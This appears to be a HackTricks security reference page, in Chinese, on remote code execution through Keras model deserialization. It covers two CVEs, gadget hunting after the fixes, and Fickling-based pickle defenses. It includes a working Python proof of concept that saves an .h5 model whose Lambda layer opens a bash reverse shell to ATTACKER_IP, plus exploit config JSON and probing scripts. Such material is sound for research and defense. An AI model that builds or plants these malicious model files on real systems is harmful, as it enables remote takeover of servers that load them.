# Keras Model Deserialization RCE 和 Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

本页面总结了针对 Keras model deserialization pipeline 的实用 exploitation techniques，介绍原生 .keras format 的内部结构和 attack surface，并为研究人员提供用于发现 Model File Vulnerabilities (MFVs) 和 post-fix gadgets 的工具包。

## .keras model format 内部结构

一个 .keras 文件是一个 ZIP archive，至少包含：<sup>[[1]](#references)</sup>
- metadata.json – 通用信息（例如 Keras version）
- config.json – model architecture（主要 attack surface）
- model.weights.h5 – HDF5 中的 weights

config.json 驱动 recursive deserialization：Keras 导入 modules、解析 classes/functions，并根据 attacker-controlled dictionaries 重建 layers/objects。<sup>[[1]](#references)</sup>

Dense layer object 示例片段：
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
反序列化会执行：<sup>[[1]](#references)</sup>
- 根据 `module/class_name` keys 导入模块并解析符号
- 使用攻击者控制的 kwargs 调用 `from_config(...)` 或构造函数
- 递归处理嵌套对象（activations、initializers、constraints 等）

历史上，这使攻击者能够通过构造 config.json 控制以下三个原语：<sup>[[1]](#references)</sup>
- 控制导入哪些模块
- 控制解析哪些 classes/functions
- 控制传递给构造函数/from_config 的 kwargs

## CVE-2024-3660 – Lambda-layer bytecode RCE

根本原因：
- Legacy Lambda 反序列化会根据攻击者控制的 marshaled code 重建 Python function：`func_load()` 对 payload 进行 base64 解码，调用 `marshal.loads()`，并创建一个 `FunctionType`。调用 Lambda 时，生成的 function 的 bytecode 会执行；而受影响的 2.13 之前的 loaders 没有对 legacy formats 强制执行 safe-mode 检查。<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

在原生 Keras v3 archive 中，Lambda function 表示为一个 `__lambda__` object，其 `code` field 包含经过 base64 编码的 marshaled code：<sup>[[17]](#references)[[18]](#references)</sup>
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"class_name": "__lambda__",
"config": {
"code": "<base64(marshal.dumps(function.__code__))>",
"defaults": null,
"closure": null
}
}
}
}
```
缓解措施：
- 对于原生 Keras v3 格式，Keras 默认强制启用 `safe_mode=True`。除非用户明确使用 `safe_mode=False` 选择退出，否则会阻止 `Lambda` 中序列化的 Python lambda；但这一保护对 legacy 格式的覆盖方式并不相同。<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

注意：
- Legacy 格式（较旧的 HDF5 保存文件）或较旧的代码库可能不会强制执行现代检查，因此当受害者使用较旧的加载器时，“降级”式攻击仍然可能适用。

## CVE-2025-1550 – Keras 3.0.0–3.8.x 中的任意 module import

根本原因：
- `_retrieve_class_or_fn` 使用 `importlib.import_module(module)` 处理来自 `config.json` 的、由攻击者控制的 module 字符串。
- 影响：精心构造的 `.keras` archive 可使 `Model.load_model()` import 攻击者选择的 Python modules 和 functions，并在 import 时触发副作用及传入攻击者控制的 arguments，即使启用了 `safe_mode=True` 也不例外。<sup>[[1]](#references)[[4]](#references)</sup>

Exploit idea:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Security improvements (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Module allowlist：imports 仅限于官方 ecosystem modules：keras、keras_hub、keras_cv、keras_nlp
- Safe mode 默认启用：safe_mode=True 会阻止不安全的 Lambda serialized-function loading
- Basic type checking：deserialized objects 必须匹配预期类型

## Practical exploitation：TensorFlow-Keras HDF5 (.h5) Lambda RCE

Legacy TensorFlow-Keras deployments 可能仍接受 HDF5 model files（`.h5`）。如果攻击者能够上传一个随后会被服务器加载或用于 inference 的 model，受影响的 loader 可能会 deserialize 一个包含攻击者控制 Python 的 Lambda layer，随后该 Python 可在应用的 model workflow 中执行。<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

用于构造恶意 `.h5` 的最小 PoC：当目标调用该 model 时，其中的 Lambda 会执行 reverse shell：
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
注意事项和可靠性提示：
- 触发点会因格式和工作流而异；所引用的 write-up 观察到 payload 在 prediction 期间执行了两次。应将副作用视为可重复的，并使 payload 具备幂等性。<sup>[[7]](#references)</sup>
- 版本固定：匹配受害者的 TF/Keras/Python 版本，以避免序列化不匹配。例如，如果目标使用 Python 3.8 和 TensorFlow 2.13.1，则应在相同环境下构建 artifacts。<sup>[[7]](#references)</sup>
- 快速复制环境：
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- 验证：使用类似 `os.system("ping -c 1 YOUR_IP")` 的 benign payload，有助于在切换到 reverse shell 之前确认执行情况（例如使用 tcpdump 观察 ICMP）。<sup>[[7]](#references)</sup>

## 修复后 allowlist 内的 gadget surface

即使启用了 Keras module allowlist 和 safe mode，允许的 callables 仍可能暴露 side effects。例如，`keras.utils.get_file` 会下载 URL，并将其写入配置的 cache location，因此它是 gadget analysis 的候选对象。<sup>[[1]](#references)[[19]](#references)</sup>

Candidate Lambda configuration（在受控测试中验证 call signature）：
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {
"module": "keras.utils",
"class_name": "get_file",
"config": null,
"registered_name": null
},
"arguments": {
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
重要限制：
- `Lambda.call()` 始终将模型输入作为第一个位置参数传入，并将配置的 `arguments` 作为关键字参数传入。对于 `get_file`，该位置参数会填充 `fname`；tensor/path 类型不匹配可能导致此 candidate 在任何下载发生前就失败，因此它不是一个保证可用的 gadget。<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## AI/ML models 的 ML pickle import allowlisting（Fickling）

许多 AI/ML model 格式（PyTorch `.pt`/`.pth`/`.ckpt`、joblib/scikit-learn artifacts，以及其他 Python-native 格式）都会嵌入 Python pickle 数据。上面的 legacy Keras Lambda 路径使用的是 marshaled function bytecode，因此属于独立的 deserialization risk。Pickle opcodes 可在 deserialization 期间调用 attacker-controlled behavior，包括 model tampering 或 RCE，而简单的 scanners 可能漏掉新出现或未列出的 dangerous imports。<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

一种实用的 fail-closed defense 是 hook Python 的 pickle deserializer，并仅允许在 unpickling 期间使用经过审核的、无害的 ML-related imports。Trail of Bits 的 Fickling 实现了此策略，并提供了一个基于数千个公开 Hugging Face pickles 构建的 curated ML import allowlist。<sup>[[8]](#references)[[13]](#references)</sup>

“safe” imports 的 security model（从 research 和实践中提炼出的直觉）：pickle 使用的 imported symbols 必须同时满足以下条件：<sup>[[8]](#references)</sup>
- 不执行 code 或导致执行（不得包含 compiled/source code objects、shelling out、hooks 等）
- 不获取或设置任意 attributes 或 items
- 不从 pickle VM 中 import 或获取对其他 Python objects 的 references
- 不触发任何 secondary deserializers（例如 marshal、nested pickle），即使是间接触发

尽可能早地在 process startup 期间启用 Fickling 的 protections，以便检查 frameworks 执行的任何 pickle loads（`torch.load`、`joblib.load` 等）：<sup>[[9]](#references)</sup>
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
操作提示：
- 你可以根据需要临时禁用/重新启用 hooks：<sup>[[9]](#references)</sup>
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- 如果已知安全的 model 被阻止，请在审查相关 symbols 后，为你的环境扩展 allowlist：<sup>[[9]](#references)</sup>
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- 如果你希望进行更细粒度的控制，Fickling 还提供了通用的 runtime guards：<sup>[[9]](#references)</sup>
- `fickling.always_check_safety()`：强制对所有 `pickle.load()` 执行检查
- `with fickling.check_safety():`：用于限定作用域内的强制检查
- `fickling.load(path)` / `fickling.is_likely_safe(path)`：用于一次性检查

- 在可能的情况下，优先使用非 pickle 的 model formats（例如 SafeTensors）。<sup>[[15]](#references)</sup> 如果必须接受 pickle，请在无 network egress 的 least privilege 环境下运行 loaders，并强制执行 allowlist。

这种 allowlist-first strategy 已被证明能够阻止常见的 ML pickle exploit paths，同时保持较高的兼容性。在 ToB 的 benchmark 中，Fickling 检测出了 100% 的 synthetic malicious files，并允许来自主要 Hugging Face repos 的约 99% clean files。<sup>[[8]](#references)[[10]](#references)</sup>


## Researcher toolkit

1) 在允许的 modules 中系统地发现 gadgets

枚举 keras、keras_nlp、keras_cv、keras_hub 中的候选 callables，并优先关注具有 file/network/process/env side effects 的对象。<sup>[[1]](#references)</sup>

<details>
<summary>枚举 allowlisted Keras modules 中潜在危险的 callables</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Direct deserialization testing（无需 `.keras` archive）

将构造的 dict 直接传入 Keras deserializer，以了解其接受的参数并观察副作用。<sup>[[1]](#references)</sup>
```python
import keras

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {
"module": "keras.utils",
"class_name": "get_file",
"config": null,
"registered_name": null
},
"arguments": {
"origin": "https://example.com/x",
"cache_dir": "/tmp/keras-cache"
}
}
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```
3) 跨版本探测与格式

Keras 存在于多个具有不同防护措施和格式的代码库/时代中：<sup>[[1]](#references)</sup>
- TensorFlow 内置 Keras：tensorflow/python/keras（legacy，计划删除）
- tf-keras：单独维护
- Multi-backend Keras 3（官方）：引入了原生 .keras

在不同代码库和格式（.keras 与 legacy HDF5）之间重复测试，以发现回归问题或缺失的防护措施。

## References

- [1] [Keras Model Deserialization 中的漏洞挖掘（huntr blog）](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – 为 serialization 添加检查](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Keras arbitrary module import（≤ 3.8）](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – TensorFlow .h5 Lambda RCE to root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Trail of Bits blog – Fickling 的新 AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – 保护 AI/ML environments（README）](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Sleepy Pickle attacks 背景](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [SafeTensors 项目](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 – Keras 2 Lambda Layers 允许任意代码注入](https://kb.cert.org/vuls/id/253266)
- [17] [Keras Lambda layer 源码（v3.10.0）](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [Keras Python utilities 源码（v3.10.0）](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [Keras `get_file` API](https://keras.io/api/utils/python_utils/#get_file-function)
{{#include ../../banners/hacktricks-training.md}}
